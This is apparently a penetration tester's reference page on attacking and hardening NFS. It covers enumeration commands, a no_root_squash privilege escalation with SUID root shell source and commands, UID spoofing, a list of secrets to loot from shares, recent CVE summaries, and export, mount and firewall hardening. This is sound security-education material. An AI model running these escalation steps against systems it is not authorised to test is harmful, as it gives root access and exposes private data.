+++
title = 'NFS'
date = 2026-10-30
type = 'notes'
weight = 500
toc = true
tags = ['protocols', 'services', 'nfs']
+++

Network File System (NFS) is a distributed file system protocol developed by Sun Microsystems in 1984. It lets clients mount remote directories as if they were local. NFS runs on **2049 TCP/UDP**; the RPC portmapper (`rpcbind`) runs on **111 TCP/UDP** and is how clients discover NFS and `mountd` (which is usually on a dynamic port in NFSv3).

> **2025–2026 context:** NFS remains a high-value target because its **defaults assume a trusted LAN** — AUTH_SYS trusts whatever UID the client sends, NFSv3 sprays RPC services across dynamic ports, and a single careless export option (`no_root_squash`, or a stray space before `(rw)`) hands an attacker root on the server. The 2025–2026 CVE feed adds three new layers: **`rpc.mountd` privilege escalation (CVE-2025-12801)**, **NFS-over-TLS client-side flaws (CVE-2025-38571, CVE-2025-68243)**, and **Windows Client for NFS and Portmapper heap overflows (CVE-2026-69949, CVE-2026-71334)**.

---

## 1. NFS Versions and Their Security Posture

The version in use determines the entire attack surface — this is the first thing to fingerprint.

| Version | Authentication | Encryption | Recommendation |
|---|---|---|---|
| **NFSv2** | IP/host-based only | None | **Do not use** — deprecated |
| **NFSv3** | IP/host-based only | None by default | **Common but insecure** |
| **NFSv4** | **Kerberos supported** | Optional (`krb5p`) | **Recommended with Kerberos** |

> **NFSv3 is still the most widely deployed version**, and it has **no native encryption** and relies on **network-level trust** for access control. That is what makes it the target in almost every engagement.

---

## 2. Basic Enumeration and Interaction

| Command | Description |
|---|---|
| `sudo nmap -sV -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <IP>` | Enumerate exports and permissions |
| `nmap --script "nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client" -p 2049 <IP>` | Full NFS script set |
| `showmount -e <IP>` | List exports (queries `rpcbind`/`mountd` on 111) |
| `rpcinfo -p <IP>` | **Full RPC service map** — shows `mountd`, `statd`, `lockd`, and their ports |
| `sudo mount -t nfs <IP>:/target-NFS/ /mnt/target -o nolock` | Mount an export locally |
| `sudo mount -t nfs -o vers=4.2 <IP>:/export /mnt/target` | NFSv4 mount — **single port, no mountd** |
| `sudo umount /mnt/target` | Unmount |
| `cat /etc/exports` | On the target — read the export options (needs local access) |

**Metasploit:**

```
use auxiliary/scanner/nfs/nfsmount
```

> **If `showmount -e` hangs**, scan 111 and 2049 and try `rpcinfo -p <IP>`. A filtered `rpcbind` does not mean NFS is down — it means you cannot enumerate the mounts without already knowing the export path.

---

## 3. The Misconfigurations That Actually Get Exploited

NFS "vulnerabilities" are almost always **misconfigurations**, and five of them account for nearly every finding.

### 3.1 `no_root_squash` — the classic privilege escalation

By default, NFS maps `root` on the client to `nobody` on the server (`root_squash`). With **`no_root_squash`**, root on your attacking machine **stays root** when writing to the share — so you can drop a **SUID root** binary and execute it on the target.

**Export option comparison:**

| Export option | Root on client = root on server? | Security risk |
|---|---|---|
| **`root_squash`** | No | Low |
| **`all_squash`** | No — **everyone** mapped to `nobody` | Low (but breaks legitimate access) |
| **`no_root_squash`** | **Yes** | **Critical** |

**Exploitation steps:**

1. Enumerate exports: `showmount -e <target-ip>`
2. Check options from a local shell: `cat /etc/exports` — look for `no_root_squash` and a writable export (`/tmp`, `/var/www`, a home directory).
3. On Kali, mount the export as root:

   ```bash
   sudo mkdir -p /mnt/nfs
   sudo mount -t nfs <target-ip>:/tmp /mnt/nfs -o nolock
   ```

4. Compile a SUID shell and copy it **as root**:

   ```bash
   cat > /tmp/shell.c <<'EOF'
   #include <unistd.h>
   int main(void) { setgid(0); setuid(0); execl("/bin/bash", "bash", NULL); }
   EOF
   gcc /tmp/shell.c -o /mnt/nfs/shell
   sudo chown root:root /mnt/nfs/shell
   sudo chmod 4755 /mnt/nfs/shell
   ```

   **Alternative — `setresuid(0,0,0)`**, which avoids some of the `setuid`-ordering pitfalls:

   ```c
   #include <unistd.h>
   int main(void) { setresuid(0, 0, 0); system("/bin/sh"); }
   ```

   **Simplest — copy `bash` and set SUID:**

   ```bash
   cp -v /bin/bash /mnt/nfs/bash
   sudo chown root:root /mnt/nfs/bash
   sudo chmod +s /mnt/nfs/bash
   ```

5. On the target, execute from the exported path:

   ```bash
   /tmp/shell -p
   id
   ```

> **The SUID bit only works if the export is `no_root_squash` AND the filesystem is not mounted `nosuid` on the target.** If the binary runs but `id` is not root, check `mount | grep <export>` for `nosuid`.

> **CVE-2025-68764** — the Linux kernel did **not** propagate `ro,noexec,nodev,sync` to automounted filesystems. An attacker who controls an automount could land a filesystem **without `nosuid`**, which reopens the SUID path even when the administrator intended to close it.

### 3.2 World-readable wildcard exports

A wildcard in `/etc/exports` — `*` or `0.0.0.0/0` — lets **any host** mount the share. This is the **single most common NFS misconfiguration** and the first thing an attacker checks.

```bash
showmount -e <target>     # an export with no IP restriction is world-mountable
sudo mount -t nfs <target>:/export /mnt/share -o nolock
```

### 3.3 UID/GID spoofing (AUTH_SYS)

NFSv3 trusts the **UID and GID the client sends**. If you know the UID of a privileged user on the server, you can create a local account with that UID and read their files.

```bash
# Create a local user matching the target UID
sudo useradd -u 1000 -M attacker
sudo su - attacker
# Files owned by UID 1000 on the share are now readable
```

> **This works without `no_root_squash`.** Any UID other than 0 is trusted as-is — the server has no way to verify that the client's UID 1000 is the same person as the server's UID 1000.

### 3.4 Sensitive data exposure on read-only shares

Even a **read-only** export is a finding. Look for:

- **SSH private keys** (`/home/*/.ssh/id_rsa`, `/root/.ssh/`)
- **Configuration files with credentials** (`.env`, `wp-config.php`, `config.php`)
- **Database files** (`.sql`, `.db`)
- **Backup archives** (`.tar.gz`, `.zip`)
- **Application source code**

### 3.5 CVE-2025-12801 — `rpc.mountd` subdirectory access bypass

**The 2026 NFS-specific CVE.** A flaw in the **`rpc.mountd` daemon in `nfs-utils`** allows an **NFSv3 client to escalate the privileges assigned to it in `/etc/exports` at mount time**. Specifically, it lets the client **access any subdirectory or subtree of an exported directory, regardless of the set file permissions, and regardless of any `root_squash` or `all_squash` attributes** that would normally apply.

| Property | Detail |
|---|---|
| **CVE** | CVE-2025-12801 |
| **CVSS** | **6.5 (Medium)** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **CWE** | CWE-279 (Incorrect Execution-Assigned Permissions), CWE-732 (Incorrect Permission Assignment for Critical Resource) |
| **Affected** | `nfs-utils` — RHEL 6/7/8/9, OpenShift, Debian, Ubuntu, Amazon Linux |
| **Fixed** | RHSA-2026:5867 / RHSA-2026:5606 / RHSA-2026:5877 (March–April 2026) |

> **Why this matters for an attacker:** it **defeats the primary defence**. An administrator who correctly set `root_squash` and `all_squash` — the two options the hardening guides tell them to set — still has a client that can reach **any subdirectory** of the export with elevated rights. It is a **confidentiality** issue (C:H), not an integrity one, but it exposes precisely the files that the export was scoped to protect.

**Check the `nfs-utils` version:**

```bash
rpm -q nfs-utils 2>/dev/null; dpkg -l nfs-utils 2>/dev/null
```

---

## 4. Kerberos-Flavoured NFS (`sec=krb5*`)

NFSv4 mandates Kerberos V5 support. The mount option `sec=` selects the flavour, and each gives a different level of protection.

| Flavour | Mechanism | Protection |
|---|---|---|
| **`sec=sys`** | AUTH_SYS (UID/GID) | **None** — the default for NFSv3 |
| **`sec=krb5`** | Kerberos V5 authentication | **Cryptographic proof of user identity** in each RPC request |
| **`sec=krb5i`** | Kerberos + **integrity** | Adds a checksum per operation — prevents tampering |
| **`sec=krb5p`** | Kerberos + **privacy** | **Encrypts every RPC request** — prevents eavesdropping |

> **`sec=krb5` provides cryptographic proof of a user's identity in each RPC request** — it replaces the UID/GID trust model entirely. **`krb5i`** adds integrity, and **`krb5p`** adds encryption.

**Enumerating a Kerberos-flavoured export:**

```bash
# NFSv4 negotiates security in-protocol — the pseudo-fs may use a weaker flavour
sudo mount -t nfs -o vers=4.2,sec=krb5p <target>:/export /mnt/target
```

> **NFSv4 lets the client renegotiate the security flavour when it crosses into a new filesystem** — the pseudo-fs often has weaker settings than the exported physical filesystem. A client that mounts the pseudo-fs with `sec=sys` and crosses into a `krb5p` export is upgraded mid-session, but the reverse — a client that reaches a weakly-exported subtree — is the exploitable direction.

---

## 5. Client-Side Attacks — Malicious NFS Server

These do **not** require compromising the server; they require the **victim to mount a malicious NFS server**.

### 5.1 CVE-2025-38571 — NFS-over-TLS NULL dereference

A flaw in the Linux kernel's **SUNRPC/NFS client TLS receive path** (`tls_alert_recv`). The code assumes valid data exists in the `msghdr` iterator's `kvec`; if a crafted RPC framing record is followed by a TLS alert, the iterator has already advanced and the function dereferences a **NULL or out-of-bounds `kvec`**.

| Property | Detail |
|---|---|
| **CVE** | CVE-2025-38571 |
| **Vector** | **A malicious NFS server — or, with `xprtsec=tls`, any on-path attacker** — sends crafted RPC framing plus a TLS alert record |
| **Impact** | **Kernel oops in the `xprtiod` kworker** → all NFS I/O on that transport wedges, or a panic where `panic_on_oops` is set. **Two bytes of kernel memory** leak into the tracepoint / error oracle |
| **Auth required** | **None** — the attacker is the TLS peer |
| **CVSS** | Critical |

> **With `xprtsec=tls`, the peer is entirely unauthenticated** (RFC 9289 opportunistic TLS). An unauthenticated MITM qualifies, and the bug fires from the workqueue receive path with no user interaction. The defence is **`xprtsec=tls` with certificate validation**, not opportunistic TLS.

### 5.2 CVE-2025-68243 — TLS X.509 certificate field mismatch

`nfs_match_client()` did **not** compare the `cert_serial` and `privkey_serial` fields when the security policy is `RPC_XPRTSEC_TLS_X509`. An attacker can present a certificate with **mismatched serial numbers but a valid X.509 structure** and impersonate a legitimate NFS client.

| Property | Detail |
|---|---|
| **CVE** | CVE-2025-68243 |
| **CWE** | CWE-287 (Improper Authentication), CWE-312 (Cleartext Storage of Sensitive Information) |
| **Impact** | **Client impersonation** — unauthorised access to NFS data, or modification of it |

### 5.3 CVE-2025-0373 — FreeBSD `VOP_VPTOFH()` stack overflow

On **64-bit FreeBSD**, `VOP_VPTOFH()` in the **`cd9660`, `tarfs`, and `ext2fs`** filesystems **overflows the destination FID buffer by 4 bytes**. An NFS server that exports one of those filesystems can be made to **panic** by mounting and accessing the export with an NFS client.

> **Further exploitation (bypassing file permission checks, or remote kernel code execution) is potentially possible but has not been demonstrated**, and release kernels have stack protection that catches some instances.

### 5.4 The rogue-server primitive

The general class: **an NFS client trusts the server**. A malicious server can:

- Return file handles that map to files the client did not request
- Return directory listings containing names that trigger a client-side parser bug
- Exploit the client's **TLS handling** (CVE-2025-38571) or **certificate matching** (CVE-2025-68243)

---

## 6. Windows-Specific NFS Vulnerabilities (2026)

| CVE | Component | Primitive |
|---|---|---|
| **CVE-2026-69949** | **Windows Client for NFS** | **Heap-based buffer overflow** — an authorised attacker elevates privileges **locally** from a low-privileged account to **SYSTEM / administrative** |
| **CVE-2026-71334** | **Windows NFS Portmapper** | **Heap-based buffer overflow** — an authorised local user gains higher privileges on the affected system |

> **Both are local privilege escalations**, not remote. They matter on hosts where an attacker already has a low-privileged foothold and the NFS client or portmapper is installed — which is common on Windows file servers and developer workstations.

---

## 7. The `no_root_squash` Variant That Is Not Obvious

A single **stray space** before the `(rw)` option changes the meaning of the export:

```
/data 192.168.1.0/24 (rw,sync,no_root_squash)
```

The space makes the option list a **separate, unmatched token**, which can silently alter how the export is applied. The hardening note calls this out explicitly as one of the ways *"a single careless export option … can hand an attacker root on the server."* Always read `/etc/exports` character by character.

---

## 8. Hardening (Defender Perspective)

The single most impactful decision is whether NFS is needed on a host at all — **CIS Benchmarks recommend removing or masking the NFS server on any system that is not deliberately a file server.**

### 8.1 The layered baseline

| Layer | Control |
|---|---|
| **1 — Need** | Remove/mask the NFS server if it is not a deliberate file server |
| **2 — Protocol** | **NFSv4-only**, TCP, **fixed ports** |
| **3 — Network** | Storage VLAN; firewall 2049; **never expose 111 or 2049 to the internet** |
| **4 — Exports** | Tight CIDR (never `*`), **`root_squash`**, never `no_root_squash` |
| **5 — Auth** | **`sec=krb5p`** (Kerberos privacy) |
| **6 — Client** | **`nosuid`, `nodev`**, `noexec` where feasible |
| **7 — Monitor** | Logs, `auditd`, periodic `showmount` audits |

### 8.2 NFSv4-only — shrink the attack surface

NFSv4 uses a **single TCP port (2049)** and drops the `MOUNT`/`rpcbind`/`statd`/`lockd` sprawl of NFSv3.

```ini
# /etc/nfs.conf — disable NFSv3, keep only NFSv4.x
[nfsd]
vers3=n
vers4=y
vers4.0=y
vers4.1=y
vers4.2=y
```

```bash
sudo systemctl restart nfs-server
cat /proc/fs/nfsd/versions    # confirm
```

### 8.3 If NFSv3 is unavoidable — pin the RPC ports

Dynamic RPC ports cannot be firewalled cleanly. Pin them:

```ini
# /etc/nfs.conf
[mountd]
port=20048
[statd]
port=32765
outgoing-port=32766
[lockd]
port=32803
udp-port=32769
```

### 8.4 Hardened export baseline

```text
# /etc/exports
# - tight CIDR, never '*'
# - root_squash kept (never no_root_squash on shared data)
# - Kerberos privacy where available
/srv/nfs/data   192.168.50.0/24(rw,sync,root_squash,no_subtree_check,sec=krb5p)
/srv/nfs/public 192.168.50.0/24(ro,sync,all_squash,no_subtree_check)
```

### 8.5 Hardened client mount baseline

```text
# /etc/fstab — nosuid + nodev are mandatory; noexec where feasible
192.168.50.10:/srv/nfs/data /mnt/data nfs vers=4.2,sec=krb5p,rw,hard,nosuid,nodev,_netdev 0 0
```

> **`nosuid` on the client is what stops the `no_root_squash` SUID trick.** Without it, a SUID binary written to the share executes as root even if `root_squash` were somehow bypassed.

### 8.6 Firewall

```bash
# firewalld — allow only the storage subnet, NFSv4 single port
sudo firewall-cmd --permanent --new-zone=nfs-storage
sudo firewall-cmd --permanent --zone=nfs-storage --add-source=192.168.50.0/24
sudo firewall-cmd --permanent --zone=nfs-storage --add-service=nfs
sudo firewall-cmd --reload

# ufw — restrict NFSv4 (2049) to the storage subnet
sudo ufw allow from 192.168.50.0/24 to any port 2049 proto tcp
sudo ufw deny 2049
```

> **Never expose port 111 (`rpcbind`/portmapper) or 2049 to the internet or a general-purpose user VLAN.** An open portmapper is trivially enumerable with `rpcinfo -p` and has been abused in **reflection/amplification DDoS** attacks.

### 8.7 Patch

- **CVE-2025-12801** — `nfs-utils` (RHSA-2026:5867 / 5606 / 5877)
- **CVE-2025-38571 / CVE-2025-68243 / CVE-2025-68764** — kernel
- **CVE-2026-69949 / CVE-2026-71334** — Windows Client for NFS / NFS Portmapper

---

## 9. Testing Methodology

```text
1. Enumerate
   - nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs
   - showmount -e <IP>
   - rpcinfo -p <IP>          # if showmount hangs
   - Check nfs-utils version for CVE-2025-12801

2. Version and security flavour
   - NFSv3 → AUTH_SYS, no encryption — assume UID/GID trust
   - NFSv4 → check sec=krb5/krb5i/krb5p on the mount

3. Export options
   - cat /etc/exports (local access) or infer from behaviour
   - no_root_squash → SUID path
   - wildcard * → world-mountable
   - stray space before (rw) → check how the option was parsed

4. Mount and read
   - sudo mount -t nfs <IP>:/export /mnt/share -o nolock
   - Look for SSH keys, .env, .sql, backups, source code

5. no_root_squash → SUID root
   - Copy/compile a SUID shell onto the share as root
   - Execute on the target
   - Verify `mount | grep nosuid` before concluding it failed

6. UID/GID spoofing (no no_root_squash needed)
   - Create a local user with the target UID
   - Read files owned by that UID

7. CVE-2025-12801
   - NFSv3 client → access subdirectories regardless of root_squash/all_squash

8. Client-side (if you control the server)
   - CVE-2025-38571 — crafted RPC framing + TLS alert
   - CVE-2025-68243 — mismatched X.509 serials
```

---

## 10. Field Notes

- **`no_root_squash` is still the single most reliable NFS escalation** — copy `bash`, `chmod +s`, execute with `-p`. But **check `nosuid` on the target mount** before concluding the technique failed.
- **CVE-2025-12801 defeats the primary defence.** A correctly configured `root_squash`/`all_squash` export is still reachable in **any subdirectory** by an NFSv3 client. Patch `nfs-utils` — this is a configuration-independent bug.
- **UID/GID spoofing works without `no_root_squash`.** Any UID other than 0 is trusted as-is; create a local account with the target UID and read their files.
- **A wildcard export is the most common misconfiguration** — `showmount -e` returning an export with no IP restriction means you can mount it.
- **`sec=krb5p` is the only flavour that encrypts.** `sec=krb5` proves identity but sends data in the clear; `krb5i` adds integrity but not confidentiality.
- **NFSv4 removes the `mountd`/`rpcbind` sprawl.** If `showmount` fails but port 2049 is open, the server is likely NFSv4-only — mount with `-o vers=4.2`.
- **NFS-over-TLS is not automatically safe.** CVE-2025-38571 is a **client-side** NULL dereference triggered by a malicious server, and with `xprtsec=tls` an **unauthenticated on-path attacker** qualifies.
- **NFSv4 renegotiates the security flavour when crossing filesystems** — the pseudo-fs can be weaker than the export.
- **Windows Client for NFS has its own local privilege escalations** (CVE-2026-69949, CVE-2026-71334) — both heap overflows to SYSTEM.
- **Never expose 111 or 2049 to the internet.** An open portmapper is trivially enumerable and has been used for amplification DDoS.
- **`nosuid` on the client is the load-bearing control** for the SUID path — without it, a SUID binary on the share executes as root regardless of the server-side squash.
